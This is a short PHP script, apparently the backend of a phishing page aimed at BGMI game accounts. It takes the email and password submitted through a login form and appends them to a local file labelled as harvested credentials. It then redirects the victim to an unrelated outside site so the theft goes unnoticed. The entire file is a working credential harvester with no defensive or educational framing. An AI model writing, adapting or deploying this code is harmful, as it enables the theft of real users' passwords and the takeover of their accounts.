<?php

file_put_contents("usernames.txt", "XSUIT(BGMI) Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://DARKMOVIES.studio');
exit();
?>